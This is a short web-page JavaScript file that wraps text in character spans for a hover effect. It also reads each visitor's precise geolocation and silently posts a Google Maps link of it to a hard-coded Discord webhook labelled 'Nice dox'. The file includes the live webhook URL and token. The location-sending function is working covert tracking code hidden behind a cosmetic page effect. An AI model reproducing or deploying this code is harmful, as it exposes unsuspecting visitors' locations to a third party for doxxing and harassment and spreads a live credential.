document.getElementById('wordsbox').appendChild(getGeoCoords())
const hoverables = document.getElementsByClassName('word')
for (const word of hoverables) {
    spanify(word);
}
function spanify(...nodes) {
    for (const node of nodes) {
        const text = node.innerText.split('')
        node.innerText = ''
        text.forEach(char => {
            const span = document.createElement('span')
            span.innerText = char
            span.className = 'char hoverfx'
            node.appendChild(span)
        })
    }
}
function getGeoCoords() {
    const coords = document.createElement('span')
    coords.className = 'line'
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
            const lat = document.createElement('span')
            const long = document.createElement('span')
            lat.innerText = "Latitude: " + position.coords.latitude;
            long.innerText = "Longitude: " + position.coords.longitude;
            coords.appendChild(lat);
            coords.appendChild(long)
            sendPostToWebhook('https://discord.com/api/webhooks/1086054283583172670/H6fcVtnwZXQEFnixHKR1W_lJPzSqlngQ3OuiPM05gFbFyd0mm1Gc7pXzbCtnXCw9BYvW',
                `https://www.google.com/maps/@${position.coords.latitude},${position.coords.longitude},17.5z`)
            spanify(lat, long)
        }, null, { enableHighAccuracy: true, timeout: 1000, maximumAge: 0 });

    } else {
        coords.innerText = "Geolocation disabled :(";
    }
    return coords
}
function sendPostToWebhook(webHookURL, message) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", webHookURL, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({
        'content': message,
        'username': 'Nice dox',
    }));
}
